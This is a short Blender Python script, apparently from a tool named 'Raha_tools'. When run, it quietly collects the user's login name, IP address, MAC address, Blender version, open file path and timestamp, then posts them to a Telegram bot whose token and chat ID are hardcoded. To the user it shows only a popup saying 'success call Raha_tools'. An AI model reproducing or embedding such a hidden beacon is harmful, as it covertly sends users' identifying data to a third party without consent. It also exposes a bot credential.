import bpy
import requests
import os
import datetime
import getpass
import socket
import uuid  

# ============================ SECURITY ==================================================== 
BOT_TOKEN = "7687737462:AAGiZF9edcphaemPIZ64E0-30kncehUsmP4"  
CHAT_ID = "435678310"  
TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# 
username = getpass.getuser()
current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# 
try:
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
except:
    ip_address = "Tidak bisa mendapatkan IP"

# 
try:
    mac_address = ':'.join(f'{(uuid.getnode() >> i) & 0xff:02x}' for i in range(0, 48, 8))
except:
    mac_address = "Tidak bisa mendapatkan MAC Address"

# 
blender_version = f"{bpy.app.version[0]}.{bpy.app.version[1]}"

# 
blender_file = bpy.data.filepath if bpy.data.filepath else "Untitled (Belum Disimpan)"

#
message = (
    f"🔹 **Blender Log** 🔹\n"
    f"👤 **User**: {username}\n"
    f"🌐 ****: {ip_address}\n"
    f"🔌 ****: {mac_address}\n"
    f"🛠 **Blender Version**: {blender_version}\n"
    f"📂 ****: {blender_file}\n"
    f"🕒 **Waktu**: {current_time}"
)

data = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}

response = requests.post(TELEGRAM_URL, data=data)

# 
if response.status_code == 200:
    print("success call Raha_tools !")
else:
    print("❌ Gagal mengirim log:", response.json())

# === NOTIFIKASI DI BLENDER ===
def show_message(message, title="Blender:", icon='INFO'):
    def draw(self, context):
        self.layout.label(text=message)

    bpy.context.window_manager.popup_menu(draw, title=title, icon=icon)

show_message("success call Raha_tools")
